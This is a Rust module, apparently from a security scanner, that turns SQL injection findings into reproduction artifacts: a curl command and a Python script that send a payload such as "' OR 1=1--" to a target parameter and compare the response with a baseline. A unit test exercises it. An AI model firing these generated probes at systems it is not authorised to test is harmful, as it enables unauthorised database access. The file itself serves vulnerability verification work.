//! Standalone Proof-of-Concept (PoC) artifact generator for curl and Python.
//! Produces fully reproducible, standalone exploitation artifacts with explicit assertions.

use crate::finding::FindingRecord;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PocArtifacts {
    pub finding_id: String,
    pub title: String,
    pub curl_command: String,
    pub python_script: String,
}

pub struct PocGenerator;

impl PocGenerator {
    /// Generates standalone reproduction curl commands and Python verification scripts.
    pub fn generate_poc(
        finding: &FindingRecord,
        target_url: &str,
        method: &str,
        headers: &[(&str, &str)],
    ) -> PocArtifacts {
        let payload = finding
            .reproduction_payloads
            .first()
            .cloned()
            .unwrap_or_else(|| "' OR 1=1--".to_string());

        // 1. Generate curl command
        let mut curl_parts = Vec::new();
        curl_parts.push(format!("curl -i -s -k -X {}", method.to_uppercase()));

        for (k, v) in headers {
            curl_parts.push(format!("-H '{}: {}'", k, v.replace('\'', "'\\''")));
        }

        let full_url = if method.eq_ignore_ascii_case("GET") {
            if target_url.contains('?') {
                format!(
                    "{}&{}={}",
                    target_url,
                    finding.parameter_name,
                    urlencoding::encode(&payload)
                )
            } else {
                format!(
                    "{}?{}={}",
                    target_url,
                    finding.parameter_name,
                    urlencoding::encode(&payload)
                )
            }
        } else {
            target_url.to_string()
        };

        if !method.eq_ignore_ascii_case("GET") {
            curl_parts.push(format!(
                "-d '{}={}'",
                finding.parameter_name,
                urlencoding::encode(&payload)
            ));
        }

        curl_parts.push(format!("'{}'", full_url));
        let curl_command = curl_parts.join(" \\\n  ");

        // 2. Generate standalone Python script
        let python_script = format!(
            r#"#!/usr/bin/env python3
# Sentinel UCMA-X Automated Reproduction PoC
# Finding ID: {finding_id}
# Title: {title}
# Technique: {technique}
# Target: {target_url}

import requests
import sys
import time

TARGET_URL = "{target_url}"
PARAM_NAME = "{param_name}"
PAYLOAD = {payload:?}

headers = {{
{headers_fmt}
}}

def verify_vulnerability():
    print(f"[*] Verifying SQL Injection on parameter: {{PARAM_NAME}}")
    session = requests.Session()
    session.verify = False

    # 1. Baseline Request
    t0 = time.time()
    resp_base = session.request("{method}", TARGET_URL, headers=headers)
    base_latency = time.time() - t0

    # 2. Reproduction Probe
    params = {{PARAM_NAME: PAYLOAD}} if "{method}".upper() == "GET" else None
    data = {{PARAM_NAME: PAYLOAD}} if "{method}".upper() != "GET" else None

    t0 = time.time()
    resp_probe = session.request("{method}", TARGET_URL, headers=headers, params=params, data=data)
    probe_latency = time.time() - t0

    print(f"[*] Baseline Status: {{resp_base.status_code}}, Length: {{len(resp_base.text)}}, Latency: {{base_latency:.3f}}s")
    print(f"[*] Probe Status:    {{resp_probe.status_code}}, Length: {{len(resp_probe.text)}}, Latency: {{probe_latency:.3f}}s")

    # Reproduction Assertion
    if resp_probe.status_code != resp_base.status_code or abs(len(resp_probe.text) - len(resp_base.text)) > 20 or (probe_latency - base_latency) > 2.5:
        print("[+] SUCCESS: Vulnerability confirmed via differential response!")
        return True
    else:
        print("[-] Verification inconclusive.")
        return False

if __name__ == "__main__":
    success = verify_vulnerability()
    sys.exit(0 if success else 1)
"#,
            finding_id = finding.finding_id,
            title = finding.title,
            technique = finding.primary_technique,
            target_url = target_url,
            param_name = finding.parameter_name,
            payload = payload,
            headers_fmt = headers
                .iter()
                .map(|(k, v)| format!("    {:?}: {:?},", k, v))
                .collect::<Vec<_>>()
                .join("\n"),
            method = method.to_uppercase(),
        );

        PocArtifacts {
            finding_id: finding.finding_id.clone(),
            title: finding.title.clone(),
            curl_command,
            python_script,
        }
    }
}

// Fallback encoder
mod urlencoding {
    pub fn encode(data: &str) -> String {
        let mut result = String::with_capacity(data.len() * 3);
        for byte in data.bytes() {
            match byte {
                b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                    result.push(byte as char);
                }
                _ => {
                    result.push_str(&format!("%{:02X}", byte));
                }
            }
        }
        result
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use ucma_core::ids::{ContentId, EndpointId, ParameterId, TargetId};
    use ucma_oracles::AggregatedOracleReport;

    #[test]
    fn test_generate_poc_curl_and_python() {
        let target_id = TargetId::new(ContentId::from_data(b"test_target"));
        let endpoint_id = EndpointId::new(ContentId::from_data(b"test_endpoint"));
        let parameter_id = ParameterId::new(ContentId::from_data(b"cat"));

        let report = AggregatedOracleReport {
            is_confirmed_vulnerable: true,
            primary_technique: "Boolean Differential".to_string(),
            composite_confidence: 0.999,
            boolean_verdict: None,
            error_verdict: None,
            timing_verdict: None,
            metamorphic_verdict: None,
            supporting_oracles_count: 1,
        };

        let finding = FindingRecord::new(
            target_id,
            endpoint_id,
            parameter_id,
            "category",
            "SQLi in category",
            "Boolean Differential",
            report,
            None,
            vec!["' OR 1=1--".to_string()],
        );

        let artifacts = PocGenerator::generate_poc(
            &finding,
            "https://target.corp/filter",
            "GET",
            &[("User-Agent", "Sentinel/1.0")],
        );

        assert!(artifacts.curl_command.contains("curl -i -s -k"));
        assert!(artifacts.curl_command.contains("category="));
        assert!(artifacts.python_script.contains("verify_vulnerability"));
        assert!(artifacts.python_script.contains("Sentinel/1.0"));
    }
}
